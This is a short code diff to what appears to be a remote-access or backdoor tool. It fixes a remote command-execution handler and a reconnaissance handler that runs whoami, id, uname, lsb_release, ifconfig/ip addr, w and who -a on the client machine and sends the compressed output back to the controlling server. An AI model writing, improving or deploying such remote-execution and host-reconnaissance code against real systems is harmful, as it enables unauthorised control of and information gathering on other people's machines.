@@ -37,7 +37,7 @@ def client_exec(client, inp):
     response.
     """
 
-    client.s.send(execute(client, ''.join(inp.split()[1:])))
+    client.s.send(execute(client, ' '.join(inp.split()[1:])))
 
 
 @module.server_handler(RECON)
@@ -64,7 +64,7 @@ def server_recon(server, argv):
 @module.client_handler(RECON)
 def client_recon(client, inp):
     ipcmd = 'ip addr' if 'no' in client.cmd_exec('which ifconfig') else 'ifconfig'
-    exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
+    exec_str = '"whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
     client.s.send(zlib.compress(execute(client, exec_str)))
 
 
